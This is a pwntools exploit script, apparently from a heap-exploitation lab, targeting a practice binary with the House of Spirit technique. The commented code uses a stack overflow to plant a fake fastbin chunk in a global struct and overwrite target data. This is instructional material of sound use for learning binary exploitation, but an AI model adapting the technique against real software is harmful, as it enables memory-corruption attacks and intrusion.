#!/usr/bin/env python
from pwn import *

BINARY = "./house_of_spirit"
elf = context.binary = ELF(BINARY)
LIBC = elf.runpath + b"/libc.so.6"
LD = elf.runpath + b"/ld.so.2"
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)

gs = """
continue
"""


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.sendafter("name: ", name)
    io.recvuntil("> ")
    index += 1
    return index - 1


# Select the "free" option; send the index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

"""
The program asks us for our age before providing a menu to allocate chunks on
the heap. We provide the max fastbin size (0x80) with a prev_inuse bit (0x01)
- this will be stored in the global user struct of the ELF.
"""
age = 0x81
io.sendafter("age: ", f"{age}")

"""
The username field of the user struct can be crafted to contain the bytes
necessary to create a fake fastbin sized chunk for free(). We provide 4 qwords,
with the last one being a valid size field for a fake succeeding chunk.
"""
username = pack(0) * 3 + pack(0x1234)
io.sendafter("username: ", username)
io.recvuntil("> ")

"""
The program maintains pointers to allocated chunks and names of allocated
chunks on the stack. The names are stored directly above the array that
contains the pointers to the allocated chunks, and there exists a stack buffer
overflow for read()ing the name input from the user. We leverage this stack
buffer overflow vulnerability to alter the contents of the stack chunk tracker,
overwriting an allocated chunk pointer to point to the user struct in the ELF.
"""
name = b"A" * 8 + pack(elf.sym.user + 0x10)
chunk_A = malloc(0x18, "Y" * 0x18, name)

"""
We call free() on the chunk in the stack, causing it to be linked into the
fastbin. Because we overwrote the chunk pointer, this free'd chunk is actually
the fake chunk we constructed in the user struct in the ELF.
"""
free(chunk_A)

"""
We request a 0x80 sized fastbin chunk, allocating the fake chunk that we just
free'd into the fastbin. This gives us the ability to write to the user
struct in the ELF. Using this, we overwrite the contents of the target struct
in memory.
"""
payload = [
    "Y" * 0x40,
    0xDEADBEEFCAFEBABE,
]
malloc(0x78, flat(payload), "B")

# Check that the target data was overwritten.
io.sendthen("target: ", "3")
target_data = io.recvuntil("\n", True)
assert target_data == flat(0xDEADBEEFCAFEBABE)
io.recvuntil("> ")

io.interactive()
